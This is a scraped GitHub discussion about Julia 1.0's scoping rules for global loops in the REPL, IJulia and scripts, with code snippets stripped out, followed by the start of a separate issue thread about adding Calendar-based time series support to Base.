inside of any top-level non-function scope. Of course, I think that's equivalent to what the old parser did, but a bit more transparent since you can call  yourself and see what the REPL will evaluate.  I actually started looking into implementing this a few minutes ago.  However, it looks like it would be much easier to implement as an option in   Writing an external AST transformation is possible, but it seems like there are lots of tricky corner cases … whereas we already had the code to get it right in . It's even more tricky for something like IJulia that currently uses  to evaluate a whole block of code and get the value of the last expression.  Not only would we have to switch to parsing expression by expression, but some hackery may be needed in order to preserve the original line numbers (for error messages etcetera). Not to mention of the case of people that  external files, which would not be caught by your AST transformation.  I seriously doubt this would be easier to explain to new users than just saying that the rules are less picky for interactive use.  Here is a rough draft of a  implementation  Okay, I've figured out how to implement a  function that preserves line-number information, and have added it to my gist. A possible (non-breaking) way forward, if people like this approach  Release a SoftGlobalScope.jl package with the  etc. functions. Use SoftGlobalScope in IJulia (and possibly Juno, vscode, and OhMyREPL). Fold the SoftGlobalScope functions into a future release of the REPL stdlib package and use it in the REPL.  Or is it practical to roll it into REPL.jl immediately?  I'm not completely clear on how stdlib updates work in 1.0. Please take a look at my implementation, in case I'm missing something that will cause it to be fragile.  Can't we have it as a non-default feature of the REPL in 1.1?  Duplicate of #28523 and #28750. To those saying they don't want to teach people about global variables, I suggest teaching functions first, before  loops. Functions are more fundamental anyway, and this will help set the expectation that code should be written in functions. While I understand the inconvenience, this scoping behavior can be turned into a pedagogical advantage ""In fact, global variables are such a bad idea, particularly using them in loops, that the language makes you bend over backwards to use them."" Adding a non-default feature to the REPL for this seems ok to me though.  @friend, remember that many of us would like to use Julia as a substitute for Matlab etcetera in technical courses like linear algebra and statistics.  These are not programming courses and the students often have no programming background.   We never do structured programming — it's almost all interactive with short snippets and global variables. Furthermore, the reason I'm using a dynamic language in the first place is to switch fluidly between interactive exploration and more disciplined programming.   The inability to use the same code in a global and a function context is a hindrance to that end, even for someone who is used to scoping concepts, and it is much worse for students from non-CS backgrounds.  Many of us Julia users have absolutely 0 CS background (including myself), but it seems to me that the proper attitude (especially for students) is a willingness to learn rather than demanding things be changed for the worse to accommodate our naivete. Now, I'm not necessarily implying that this particular change would be for the worse as I only have a limited understanding of what's going on here, but if it is the case that this is a significant complication or makes it excessively easy to write needlessly badly performing code it does not seem worth it to make a change in order to have a better lecture example.  You can't change the laws of physics so that the electrostatics examples you show to freshman are more applicable to real life. So my question as a non-CS user who also cares about performance is how would I be likely to screw up if this were made the default behavior.  Is it literally just the sorts of examples we are seeing here that are a problem (which I was already aware of), or are we likely to often screw this up badly in more subtle ways? For what it's worth, I do agree that having code behave differently depending on its enclosing scope is a generally undesirable feature.  Making code harder to write interactively, forcing beginners writing their first loops to understand obscure scoping rules, and making code pasted from functions not work in global scopes does not help programmers write fast code in functions. It just makes it harder to use Julia interactively and harder for beginners.  Making an ""unbreak me"" option the default seems wiser, especially an option that is aimed squarely at beginning users.   If it is a non-default option, then precisely those people who need it most will be those who don't have it enabled (and don't know it exists).  What would the proposed REPL-mode do to ed scripts?  Would the evaluation of global statements depend on whether the REPL mode is activated?  If so, IMO this would be at odds with the 1.0 stability promise.  If we did something like this it seems like it might make sense for the module to determine how it works. So  would be a ""soft scope"" module while by default other modules would be ""hard scope"" modules.  I was interested to see if it was possible to monkey patch the REPL to use @friend's  function and it appears it is without too much effort (though quite hacky). See the gist. This doesn't work with Juno (or anything else that calls  directly). I'm not going to be recommending this to people, but it's quite useful to me when doing quick-and-dirty data analysis. I would very much like to see a (better thought out) solution since it really is quite confusing for inexperienced and often reluctant coders (i.e., my students) when you can't copy and paste in code from a function into the REPL to see what it does and vice-versa. (BTW the above is about as much testing as it has had!)  Nothing.   Basically, the proposal is that this would only be for code entered at an interactive prompt.   As soon as you start putting things in files, you need to learn the ""hard scope"" rules.   Hopefully, when you start putting code into files you should start using functions. It's not ideal for there to be pickier scoping rules for global code in files than at the prompt.   But I think that #19324 combined with the Julia 1.0 stability promise leaves us with no ideal options.  @friend Having taught courses using Julia to students with prior exposure to Matlab/R/..., I sympathize with this concern. But at the same time, I don't think that using Julia just as a Matlab etc substitute is a viable approach as demonstrated countless times by questions on Discourse and StackOverflow, this can lead to performance pitfalls that are difficult to fix and understand, possibly entailing an even larger cost than investing in understanding how Julia is different from these other languages (cf posts with topics ""I translated this code from Matlab and it is 10x slower""). I think that the key issue is the silent failure; the issue per se is easy to understand and fix. I would suggest keeping the new behavior, but giving a warning in  (by default; it should be possible to disable it).  Sorry, but this argument is ridiculous to me.   I'm not talking about classes where I'm teaching programming.  There's a place for simple interactive computations, and in non-CS classes it's common to be introduced to programming languages as a ""glorified calculator"" to start with.  Teaching performance computing in Julia is an entirely different process — but it doesn't hurt if they've already been using Julia as their ""calculator."" If you start by introducing students to Matlab as their ""calculator,"" it's much harder to make the transition to ""real"" programming, because their first instinct is to do as much as possible with Matlab before jumping ship, at which point their bad habits are ingrained and they are reluctant to learn a new language.  In contrast, if you start with Julia as your glorified calculator, when it comes time to do more serious programming you have a much wider array of options available.  You don't have to train them to cram everything into ""vector"" operations or force them to do things badly before they do it right. Are you saying I shouldn't use Julia in my linear-algebra course?   Or that I should only use it if I'm prepared to teach computer science as well as linear algebra?  I agree with @friend both on the problem (teaching to non programmers becomes much harder) and on the solution (make things work in the REPL and the various IDEs). Including a script would still have the Julia 1.0 scoping rules but that's less of a concern, one just has to be careful to have the ""we can put our for loop in a function and then call the function"" class before the ""we can put our for loop in a file and include the file"" class. This sounds like a good compromise as interactive debugging at the REPL doesn't become more painful than it needs to be (or more confusing to new users), while normal code in scripts has to follow strict scoping rules and is safe from bugs overwriting some variables accidentally.  You may have misunderstood what I was saying (or I did not express it clearly). I was talking about courses that use Julia to teach something domain-specific (eg I taught numerical methods to econ grad students), not CS courses (which I have no experience with). The point that I was trying to make is that it is reasonable to expect a certain level of difference between Julia and language X (which may be Matlab); conversely, ignoring this can (and does) lead to problems. Personally, when learning a new language, I prefer to face these issues early on; also, I think simplicity and consistency of the language semantics is more important than similarity to other languages in the long run. But I recognize these preferences as subjective, and reasonable people can have different ones.  I've created the (unregistered) package  this seems reasonable, I can go ahead and register the package and then use it by default in IJulia (and perhaps submit PRs to Juno etcetera).  Obviously.  When I say ""use Julia instead of Matlab"", I don't mean I'm trying to teach them Matlab syntax in Julia. It's not about differences from Matlab per se.  I would really rather not talk about global vs local scope and the utility of a  keyword for static analysis the first time I write a loop in front of non-CS students, or the first time they paste code from a function into the REPL to try it interactively.   I would rather focus on the math I'm trying to use the loop to express. No one here is arguing for soft interactive scope just because that's what Matlab users expect.  We are arguing for it because that is what all first-time users will expect.   (And because even for experienced users, it's rather inconvenient to be forced to add  keywords when we are working interactively.)  One other fix not mentioned here is to simply stop making ‘for’ define a scope-block (just function and let would create new scope)  @friend, I'd rather focus this discussion on things that we can do before Julia 2.0.   I agree that having interactive mode behave differently is only a stopgap, though, and we should seriously contemplate changing the scoping rules in a few years.  Good point, this also needs  😀 (I think this module/namespace/behavioral effect already is reserved/exists) As a reminder here, the change was to ensure that code behaves the same in all global scope environments, regardless of what else had previously been evaluated in that module. Before this change, you could get completely different answers (resulting from different scope assignment) simply by running the same code twice or by moving it around in a file.  The number of complaints I saw about that in practice (zero) are certain to be dwarfed by the number of complaints and confusion you will see (and are already seeing) about the current behavior.  Do you mean that in the below code,  changes between the first and second  loops? In my mind, that's expected behavior, not a bug.  @friend @friend I suppose adding a function (say, ) can be done with just a minor version bump?  We can also warn 'ing another file from 'ed script and then put some pedagogical messages there to nudge them to use .  Some thoughts I wrote down last night while trying to wrap my head around this issue (yet again) to try to figure out what the best course of action might be. No conclusion, but I think this lays out the problem quite clearly. After having thought about this issue for some years, I don't think there is any ""ideal solution""—this may be one of those problems where there are only suboptimal choices.  People naively view global scope as a funny kind enclosing local scope. This is why global scopes worked the way they did in Julia 0.6 and prior  If an outer local scope creates a local variable and an inner local scope assigns to it, then that assignment updates the outer local variable. If an outer global scope creates a global variable and an inner local scope assigns to it, then that assignment previously updated the outer global variable.  The main difference, however, is  Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope. Whether a global variable exists, however, cannot be independent of order, since one evaluates expressions in global scope, one at a time.  Moreover, since global scopes are often quite lengthy—not infrequently spread across multiple files—having the meaning of an expression depend upon other expressions an arbitrary distance from it, is a “spooky action at a distance” effect, and as such, quite undesirable.  This last observation shows why having the two different versions of a for loop at global scope behave differently is problematic Also note that the contents of  and  are identical and we could simplify the example by including the same file twice with a different meaning and behavior each time.  Another problematic case is a long-running REPL session. Try an example from somewhere online? It fails because you happened to have a global variable by the same name that the example uses for a local variable in a for loop or similar construct. So the notion that the behavior is the only one that can cause confusion and problems is definitely not accurate. I agree that the new behavior is a usability issue in the REPL but I just want to temper the conversation and present the other side clearly here.  My small suggestion, that does not deal with the repl problem, but would be useful for didactic purposes when teaching the language not-interactively, at least define a main block named ""program"", like can be done in fortran (it is the same as the ""let...end"" above, just with a more natural notation) program test ... end one could teach the language without going into the scope details and only eventually discuss that point.  How many mailing-list complaints and github issues have been filed about this?  Zero, by my count.   Why?  Probably because this behavior is fundamentally unsurprising to people — if you work in global scope, you depend on global state. I think this is a false equivalence — there is a vast disparity in the level of potential confusion here.  In Julia 0.6, I could explain your example to a student in seconds ""Oh, see this loop depends on , which you changed here.""   In Julia 1.0, I'm honestly worried about what I will do if I'm in the middle of a linear-algebra lecture and have to mysteriously type a  keyword in front of students who have never heard the word ""scope"" in the CS sense.  Absolutely not. Do you seriously want to go back to the pre-v0.2 world (see #1571 and #330) of loop scope? We have actually never fully supported copying and pasting code from a function line-by-line into the REPL. So we can view this as an opportunity to make that work. Specifically, while it ""worked"" for  loops, it did not work for inner functions Inside a function,  will mutate the  from the first line. In the REPL it won't. But with a transformation like that in SoftGlobalScope.jl it could work. Of course, we probably wouldn't want that on by default since then pasting stand-alone function definitions wouldn't work. The first thing that comes to mind is a REPL mode for line-by-line function debugging.  No, I want to go back to the 0.6 world. 😉  I guess I was responding more to  I very much appreciate this sentiment and for my use cases it would really help. From my perspective it is really about making the REPL as useful as possible rather than changing the scoping rules of the language directly. That said, the more I think about this problem the more I see the conflicting views I (personally) hold as to what the REPL should do. To be concrete, I'd very much like it if the REPL matched the scoping rules of a function body; i.e., variables are local rather than global and you can just copy-and-paste code directly from a function and know that it will work. I imagine a naive implementation would be something like let-block wrapping (as has been mention previously) of the form being transformed into Done properly (i.e., by someone who knows what they are doing), I imagine that this would have a number of benefits over the existing REPL. 1. previous workflows with interactive data analysis/computation just work. 2. far fewer posts on Discourse where the basic response is ""stop benchmarking with global variables"" - everything would be local and so hopefully fast! ) 3. copy-and-paste to/from a function body works as expected. 4. a  like function is trivial if the backing store is some sort of Dict; just clear it out. 5. globals become explicit - things are local unless you specifically ask for them to be global; this is a big advantage from my perspective, I don't like implicitly creating globals. A very minor final point (and I hestiate to add this!), this would match the behaviour of Matlab making it easier for people transitioning - at the Matlab REPL all variables seem to be local unless explicitly annotated as global. Until a few hours ago this story sounded great to me. But after Jeff's comment about functions I thought about pasting in stand-alone function definitions and how this approach would basically prevent that since function definitions should go in the global scope (at least, that is probably what is intended); but then what if they were intended to go into the local scope (an inner function)? There is no information to disambiguate the two possibilities. It would seem that two REPL modes are needed, one with local scope and one global scope. On one hand that could be very confusing (imagine the Discourse posts...) but on the other it could be extremely useful. (Having both REPL modes would also be non-breaking since you are just introducing new functionality ) ) Going for the halfway house of  might end up being the least confusing compromise but my worry is that it's just another set of rules to remember (which things work in the REPL but not in my function body/global scope and vice-versa). Apologies for the long post but I think this is important for usability (and it helped me think it through!).  Hmm, did you really make a systematic study of this? I must have missed that. Nevertheless, this does not mean that this behavior is not a source of bugs or unexpected results; just that after the user has figured it out, it was recognized as correct behavior and thus did not prompt an issue/complaint. I sympathize with this problem. When I taught into some simple programming to econ students necessary for a course, I usually suggested that they go back and forth between wrapping code in functions, and simply commenting out  and  and running things in the global scope, so they could inspect what is happening. This pretty much made up for the lack of debugging infrastructure at that time in Julia. It appears this approach is no longer feasible. But I wonder if it was really the right way to do it anyway, and in the meantime various things have improved a lot (#265 was fixed, Revise.jl and recently Rebugger.j have improved workflow/debugging considerably). It seems that this issue does not bother experienced users very much, the main concern is confusion in a pedagogical setting. I have not experimented with this myself yet, but I wonder if we could adapt our approaches to teaching instead, eg introduce functions before loops, avoid loops in global scope. These are elements of good style anyway and would benefit students.  Just a wee note whilst special casing the global scope of the REPL, will allow copy-pasting code into and from functions, it will not allow copy-pasting into/from the global scope of another module.  This is totally impractical in a class that is not focused on teaching programming.   I might as well not use Julia in my classes if I can't use it interactively and/or have to write functions for everything first. (And it's not just pedagogical.  Loops in global scope are useful for interactive work.  And one of the main reasons people like dynamic languages for technical computing is the facility for interactive exploration.)  There have been dozens of threads and issues over the years in which people are confused or complaining about the old ""soft/hard scope"" distinction, so claiming that no one has ever been confused by or complained about the old behavior is just... not true. I could dig some of them up, but you were around, @friend, so you can dig them up just as easily and I have a hard time believing that you didn't notice or don't remember these complaints and conversations.  @friend, I'm specifically referring to people complaining that a global loop depends on global state.  I don't recall anyone complaining that this was bad behavior. I agree that people have been confused about when and where assignment defines new variables, but it has usually been in the other direction — they wanted local scopes to act more global (rather than vice versa), or to not have a distinction between  and .   IIRC, the complaint was never that assigning to a global variable in a global loop had the surprising side effect of modifying a global. I agree that the whole issue of scoping is confusing to new users, and it will continue to be so.  But the confusing part was not cases where assigning to a global variable name affected the global state.  @friend I have the feeling that previously, the confusion with soft/hard scope was more of a theoretical nature (of people reading the manual) rather than of a practical on (of people getting unexpected results).  That was definitely how it was for me and what, e.g., the search results here support this; I found one counter-example here. On the other hand, this new behavior will not confuse people when reading the manual, but when using the REPL.  Arguably the latter is worse.  SoftGlobalScope.jl is now a registered package.  My intention is to enable it by default (opt-out) for IJulia, at least this semester.  @friend, even your ""counter-example"" is about someone confused by hard scope, not by soft scope.  Making more scopes ""hard"" in 0.7 is certain to create more of this sort of confusion.  I would point out that IJulia has the interesting possibility of making variables local do blocks by default. I.e. if you do this in a single block then it works ... and  is only visible within this evaluation block. If you wanted it to be visible outside, you would have to do this I have also considered a similar approach for Julia where the blocks are files rather than module. In other words just doing  at top scope creates a variable that is file-local rather than global. To declare a truly global variable, you'd need to write  which would then be visible throughout the module. Perhaps too weird, but it has occurred to me many times over the years.  @friend, I think this would be even more confusing, and would run counter to how notebooks are normally used.  It is common for the same variable to be used/modified in multiple cells, so requiring a  keyword for all inter-cell variables is a nonstarter to me — it would require even more discussion of scope concepts than the issue with  loops we've been discussing here.  I think as long as we all agree --- as we seem to --- that this is mostly or entirely an issue for interaction, then we have a way forward. If we special-case this in the REPL (as is being done for IJulia), the only bad case is developing something in the REPL and then moving it to top-level script code. Arguably that's the point where you should introduce functions, so I don't think it's so bad. Copy-pasting code between the REPL and function bodies will work (mostly), which is probably good enough. Then we also have the option of further justifying/clarifying the distinction by making REPL variables somehow local to the REPL --- i.e. not normal global variables, not available as . This is very similar to what @friend just proposed above, but shared among all input blocks/cells.  From a practical point of view, getting this ""fixed"" in the REPL is not only important for teaching/non-programmer users. This behaviour also makes interactive debugging via the REPL (by copy-pasting parts) very unpractical. This mode of debugging can sometimes be preferable (even to a good debugger and) even for experienced programmers (and is often one of the reasons to prefer a dynamic language). Of course for the experienced programmers, being optional shouldn't be a problem; For novice users it would be preferably the default. @friend  As a naive programmer, I don't really see what is so wrong in viewing the global scope as a funny kind enclosing local scope, especially in dynamic languages. I do understand that from a compiler point of view it is not necessarily correct (in Julia), but it is a nice, easy and useful model for a (naive) programmer. (I also suspect it might be actually implemented that way in some languages). Julia also seems to presents it that way to the programmer The following function function will give the error ""a not defined"", which it will not do if a=1 is put before the for loop. function test()     for i = 110         a=a+i     end     a=1     @friend a end which, unless I complete misunderstood, seems at odds with ""Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". I very much agree with avoiding ""spooky action at a distance"", and much prefer explicit definition for using globals at the function/call stack level and would personally also like having something like loading from a file in its own scope, and requiring explicit definition for using global variables. At the level of loops is going a bit to far for me though, as the definitions/context is usually quite near. The 3 files example is a bit contrived (and fails with the expected ""a not defined"" error) You would normally put the initial definition in the same file.  There is actual spooky danger in this (and I have been bitten by it in other languages) in that includes are run in the global scope, so you are inadvertently defining a global variable that may interfere with other code. However, having to use global in the loop is not a solution to this problem. wrt to the long-running REPL session The current behaviour replaces a very rare and easy to spot failure mode for running an online example in the REPL (you miss copy/pasting the initial definition of the variable before the loop, and already have the same variable defined globally from something previous) with not being able to run an online example correctly if it is part of a function (without adding global everywhere), and not solving the problem if it is not (if global is already there in the online code, you will still use the wrong value in the already existing global variable)  I should have tuned into this earlier, but after a brief moment of concern all seems to be well. Indeed Rebugger (which is exactly that) works properly on 1.0 only because it lacks the scope deprecation of 0.7, and could never be made to work on 0.6. However, I'm pleased to be able to verify that SoftGlobalScope.jl seems not to break that. For example, if you step deeply enough into  you get here So it works fine on 1.0 (with or without ). On 0.7, evaluating this (with or without ) will yield So 0.7/1.0 are definitely a step forward, and if  makes certain things easier without breaking important functionality that's great. The biggest concern, therefore, is simply how to intercept this appropriately without tanking other packages ( @friend, SoftScope does not touch the arguments of macro calls (since there is no way to know how the macro would rewrite it), so  is protected.  outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". The (outer) local variable  exists, but has not been assigned yet. If the loop tried to assign to  before reading it, the assignment would be visible outside as well. In general, creating a variable binding and assigning a value to it are separate steps.  What is the time-line on this?  It seems it would be a great improvement to user usability.  And at this ""critical"" time of Julia with 1.0 out, it would seem advantageous to get this fixed asap (as suggested by Jeff above) and tag a new version Julia or REPL version.  (Sorry for this arm-chair comment, as I certainly will not fix this!)  @friend  I was going to argue that while this is true (for the implementation/compiler), the naive julia programmer cannot not see any different behaviour from his simpler conceptual model (a variable starts existing at the moment it is defined). Unfortunately you are right, the following code will not give an error, while it will give an error if you leave out the a=2 at the end function test()     for i = 110         a=1     end     println(a)     a=2 end I'll explain the unfortunately I can understand the behaviour (because i've worked with compiled languages before) but still find it confusing and unexpected. How bad must it be to someone with only scripting experience or new to programming. Also, I found some code that shows the behaviour, I do not see a useful application (maybe you can help me there) On the REPL I just got more convinced that changing the scoping back to ""normal"" at  least in the REPL (no need to add global in loops) is high priority I was testing some things in the REPL today and got (again) bitten by it, taking some time to realize it. Given that I follow Julia already some time, really like a lot of it, am even following this thread about the problem, I would even call it a showstopper A newbee (to the Julia) testing out the language is very likely not to find out the problem and just give up.  @friend and I are both on long-awaited vacations (I should not be reading this). We can figure out what to do in a week or so. @friend, while the feedback is appreciated, scoping rules are not up for a broader debate or revision. The only thing on the table is special-casing interactive eval. The SoftGlobalScope package is already an excellent experimental implementation and it may just be a matter of making that part of Base and using it in the REPL.  @friend A short answer is that I think it's easier if the scope of a variable corresponds to some block construct (e.g. the body of a function or loop). With your suggestion, the scope of a variable would be some subset of a block, which I think is ultimately more complex and confusing --- you can't point to a syntactic form that corresponds to the scope of the variable. Yes, I can believe this is a mismatch for some people's intuition. But you can only optimize for the first ten minutes of using a language up to a point. The real question is, how hard is it to teach/learn how it works, and which design will save time in the long run (by making the language simpler, making it easier to develop tooling, etc.)?  (in agreement with much of the above about modifying the behavior of the REPL) I'd like to see the REPL be in a way that does not lead to this stackoverflow question  and sooner would be best as many new eyes are looking at Julia  I agree... And also think that the scoping rules shouldn't necessarily change, just all of the interactive interfaces (i.e. the REPL, Jupyter, and Juno control enter) This is not just about beginners learning a new rule. If you can't copy and paste fragments of code into the REPL, jupyter etc and also into functions, it is a major annoyance for intermediate programmers as well. Of course, I also agree with the other posters... with beginners they going to take code fragments they see within functions, copy I into scripts, and be completely confused when it doesn't have the same behaviour when copied inside of a function, in juno, the repl, and jupyter. There will be 100 stack exchange questions which come down to the same issue. Intermediate programmers are going to have all sorts of homegrown solutions with wrapping in  blocks, etc which will confuse things further  Possibly, but at this stage this is hypothetical (also the OP of the question linked is asking about the rationale for the scoping rule, as opposed to being confused about it). Also, while I respect the teaching experience of everyone who has concerns about this, whether this turns out to be a big deal in the classroom is something that time will tell.  the questioner appears to have been confused by it ""I wonder if this is intuitive to beginning julia users. It was not intuitive to me ...""  Not to mention that this is someone who clearly knows enough about programming languages to understand the nuances of scope. What about all of the matlab type users that are completely ignorant of these topics..., and probably will never invest enough time to understand the nuances.  I've already answered multiple questions related to this on stackoverflow, mostly by new users, and even more in real life (last one just yesterday, from a Matlab user, who saw this as a no go).  In my ""spare time"", I've been adding  and  tags to the SE questions.  I only stop because of lack of time, not because there aren't more.  Conclusion after much discussion including triage we're going to include something along the lines of  in Base and use it in the REPL and all other interactive evaluation contexts. @friend has pointed out that the way this is implemented is actually essentially the same as how soft scope was previously implemented, so to some extent we're coming around full circle. The difference is that now there is no scope behavior in modules or scripts, only in REPL-like contexts. I also think that explaining soft scope as a source rewrite is clearer than trying to distinguish between hard and soft scopes (which we never how Jeff explained it, I might point out).  These two statements confuse me a bit as they seem a bit contradictory Does this mean that the module  has sometimes a soft scope (say at the REPL prompt) and sometimes a hard scope (say when )?  Would it not make sense to say that  always has soft scope? And a module can opt-in to soft scope by ?  (I guess) scoping rules cannot be changed in scripts because it would be backwards incompatible, i.e. would break the promise that any code written for 1.0 will run on any 1.* version. You are correct though that the same problem with scoping for the REPL also applies to scripts (naive user at a complete loss why his/her code does not work properly when run as a script). A way to solve/alleviate this problem without major incompatibilty would be to add an option to the julia cmdline to use  softscope (or alternative) , e.g. julia -f programfile, and show this option in any description/tutorial that a beginner is likely to come across. I also see a potential alternative for the softscope that may have some advantages (though i am probably overlooking disadvantages) What if a file (a called script) would always introduce its own local scope scoping rules would be in complete consistency with those in functions, and with the expectations of a lot of users. It would also remove a lot of the performance liabilities with new users  No more unneeded globals (globals would have to be explicitly defined), and code might be compiled (How many times have you had to say to put everything in a function, and to avoid using globals?)  I've just hit this and was completely boggled to be honest, having never seen it before in any other language. I'm planning on introducing an optional Julia course for advanced R users in my uni later this year once things have settled down, and my students will hit this on day 0 when they start randomly typing things in the REPL. And the fact that  loops behave differently from  statements just rubs salt in the wound, however logical this may be in terms of scoping. Scope inside functions is sufficiently hard to get biology students to grasp, the idea of having to explain albeit perceived glaring inconsistencies in it in the REPL / in a script / in a for loop / in an if statement (because that's what we're talking about here) in a way that is different from every other language on earth makes me very sad. I understand the backward compatibility promise that was made, but having this work as expected by every non-cs person on the planet (and most cs people I suspect) seems like a bugfix rather than a backward compatibility issue - we're not saying that every bug will be reproduced for ever are we? The REPL fix is obviously essential, so it's great that you're proposing this, but then having to explain you can't copy a script into the REPL and expect the same behaviour seems as bad as or worse than the original problem. Please, please, please think about treating this as a bugfix and pushing it out with scripts as well as the REPL - even if there's an switch to go to the ""old"" behaviour - and doing it as soon as possible in 1.0.1.  A colleague that I was trying to get to learn julia also just ran into this. Having to explain the whole global vs. local variable thing at the first steps is not ideal...  I don't think treating this as a ""bugfix"" is in the cards, because it would break the 1.0 stability contract.   However, it seems reasonable to me to use softscope for scripts run with  (i.e. ""interactive"" mode). (That is, there would be a flag  and it would default to the value of .)  We'll have to consider the script mode choice.  For that matter, it's not crazy to me to default to  for any ""script"", i.e. for , and only turn on the ""hard"" scoping rules for modules and  (at which point you should really be putting most code into functions).  That.  The other one to seriously consider is Juno.  Remember that people will  through their code to do interactive development(especially when working with the regression tests) and then later expect to be able to run the same file.   Should it matter if the code is in a  or not (which I think might introduce a scope)?  It would be very confusing to the user if the same text changes when in a  vs. not when using Atom's integration, and is inconsistent with doing  as well. It sure sounds to me like the best solution is that the hard-scope is simply an opt-in thing, where if every other usage (including  within scripts) uses  unless you say otherwise.  Do you want to write  to introduce every variable? That would also ""fix"" this, and be more like other languages. That is not how this works. You can't get any change to the language you want just by calling the current behavior a bug. I reeeally don't think there should be a command line option for this. Then every piece of julia code will have to come with a comment or something telling you which option to use. Some kind of parser directive in a source file would be a bit better, but even better still would be to have a fixed rule. For example, hard scope inside modules only might make sense. Let me try again to provide an explanation of this that might be useful for avoiding the mania, hysteria, and carnage people are seeing in the classroom "" Julia has two kinds of variables local and global. Variables you introduce in the REPL or at the top level, outside of anything else, are global. Variables introduced inside functions and loops are local. Updating global variables in a program is generally bad, so if you're inside a loop or function and want to update a global, you have to be explicit about it by writing the  declaration again. "" Perhaps that can be improved; suggestions welcome. I know, you'd rather not need any sort of explanation at all. I get that. But it doesn't seem so bad to me.  I agree.  Sounds like a teaching and communication headache to me. Just so I understand if I had a short script (not in a module!) in a  file which I had copied from an IJulia notebook, then if I ran that code in either the REPL directly or shift-enter in Juno, then it would behave consistently as soft-scope... but if I copied it instead of a  block then it would yell at me about globals?  But if I copied that code inside of functions inside of a module, then it should work. If so, that makes complete sense,is very teachable and coherent.  Top-level scripts are an interactive interface for exploration, etc. but you would never put that kind of code in a module.  Modules are something that you should fill with functions are very carefully considered globals.  It would be easy to tell people about those rules.  No, I'd rather not! But scripting languages that have a REPL rarely do that (e.g. ruby, python, R, ...), they behave like Julia v0.6 did. I completely understand what you're saying here, and I won't (touch wood!) make this mistake again. But the whole problem I'm worried about is not me. I've found it relatively easy to introduce scope (without mentioning it directly) when I explain that variables inside functions can't see ones outside and vice-versa (even though that's more an aspiration than a fact in R!), because functions themselves are already a relatively advanced concept. But this hits much earlier in the learning curve here where we don't want anything remotely as complicated as scope to be impinging on people... Note also it's not just ""variables you introduce in the REPL or at the top level, outside of anything else, are global"" and ""variables introduced inside functions and loops are local"", it's also that variables in if statements in the REPL or at the top level are global but variables in a  are local. We end up down a rabbit-hole of ""just try it and work out for yourself whether it's local or global, good luck"". However, I agree with @friend - the proposal that ""hard scope inside modules only might make sense"" seems completely fine to me! Modules are a sufficiently advanced concept again... if soft scope works for the REPL and scripts, that's absolutely fine.  What I'm trying to get at is that I feel a simple description of global vs. local is sufficient for early-stage teaching --- you don't even need to say the word ""scope"" (it does not occur at all in my explanation above). When you're just showing some simple expressions and loops in the REPL, you're not teaching people about testsets and you don't need an exhaustive list of the scoping behavior of everything in the language. My only point is, this change does not suddenly make it necessary to teach lots of details about the language up front. You can still ignore the vast majority of stuff about scopes, testsets, etc., and a simple line on global vs. local should suffice.  In a world where everyone started writing all of their code from scratch, I would agree completely. The issue is that you need to teach students not just about scope, but also about understanding the scope of where they copy-pasted code they got from.  You need to teach them that if they copy-paste code that is on stackexchange within a function or a let block that they need to scan through it and find where to add ""global"" if they are pasting it into the REPL or a  file.  But if they are copying that code inside a function or into the Jupyter notebook. they shouldn't.  And if they find code inside of a stackexchange or tutorial page that has global variables in it, but they want to copy and modify that code inside of their own function, then they need to strip out the global. And then students start asking why does  create this scope they need to worry about but not other things....  Pop quiz in julia 0.6, is  global or local The answer is that there's no way to know, because it depends on whether a global  has been defined before. Now, you can say for sure that it is local.  Folks, this discussion is verging on no longer being productive. Jeff knows very well that the old behavior was nice in the REPL. Who do you think designed and implemented it in the first place? We have already committed to changing the interactive behavior. A decision still needs to be made about whether a ""script"" is interactive or not. It sounds interactive when you call it ""a script"" but it sounds far less interactive when you call it ""a program""—yet they are exactly the same thing. Please keep the replies short and constructive and focused on the things which still must be decided. If there's comments that deviate from this, they may be hidden and the thread may be locked.  One thought that I had but we dismissed as being ""too annoying"" and ""likely to cause the villagers to get out their pitchforks"" was that in non-interactive contexts, we could require a  or  annotation in ""soft scope"". That would guarantee that code from a module would work the same if pasted into the REPL. If we applied that to ""scripts""/""programs"" then the same would be true of them.  When I was first introduced to Julia (not a long time ago, and I come from a Fortran background mostly), I was taught that ""Julia is compiled and fast at the function level, thus everything that must be efficient must be done inside functions. In the main 'program' it behaves like a scripting language"". I found that fair enough, as I cannot imagine anyone doing anything too computationally demanding without understanding that statement. Therefore, if there is any sacrifice in performance at the main program for using the same notation and constructions than in the functions, I find that totally acceptable, much more acceptable than trying to understand and teach these scoping rules and not being able to copy and paste codes from one place to another. By the way, I am a newbie in Julia yet, having chosen it to teach some high-school and undergraduate students some basics of simulations of physical systems. And I am already hopping this issue returns to the 'normal' behavior of previous versions, because it gives us quite a headache.  This conversation is locked now and only Julia committers can comment.  @friend, what would be the plan to implement the semantics you suggested in this discourse thread, initially only in the REPL and opt-in elsewhere? It sounds like you are planning to put that directly into the lowering code (), rather than as a syntax rewriting ala SoftScope.jl?  Or would you rather have it as syntax rewriting first (modifying SoftScope to the proposed rule and converting it to a stdlib), and defer putting it into the lowering code for a later Julia release? ",240,51,1635,0,0,1062,42,
JuliaLang/julia/3524,0.09302317,JuliaLang,julia,Time series support in Base?,25402,332,210,0,12,"Is it possible to merge Calendar into Base, possibly after some bikeshedding? We had so much discussion about time series support last year, then Calendar became the de facto time series tool without ever entering Base.  plus one If it's ironed out enough, I think time series support is a very natural expectation of Base material.  I really wish that this didn't entail depending on ICU, but we probably should.  Please ping me when this lands, as I should probably update build recipes and debian package requirements to include .  How much functionality can we retain without ICU?  I've started digging into it a little bit, and @friend can speak to it more, but currently  is very dependent on ICU. Excluding ICU would basically require rewriting everything, but I'm also inclined to think we could get the majority of the functionality in a very Julian way without ICU and also without it being too difficult to implement (ICU has pretty good documentation of everything). Would definitely be a fun project if we decided to go that way.  @friend It depends on what you mean by ""majority of the functionality"". Implementing zulu time in pure julia would be easy. Adding timezone support, however, would be quite difficult. As i see it, proper timezone handling is Calendar's raison d'etre.  @friend agree with @friend. Zulu time is implemented in pure Julia in  (the api is different from Calendar, but that would be a trivial change) Adding timezone support is the missing piece. I had some julia code to parse the olson database, but never got to implementing the conversions. On top of that, one needs leap second support. Another large piece of functionality that ICU provides is date formatting/parsing. All of which is certainly doable, but is a large chunk of work.  ICU is big, but it is easy to get on Linux and is included in OS X. I believe it also works on Windows. Even if we can reimplement much of what we need in Windows, it will be quite a chore to support. I am in favour of using ICU and bringing Calendar into Base. Over time, we could reduce our dependence on ICU, if circumstances demand.  My vote would be to start 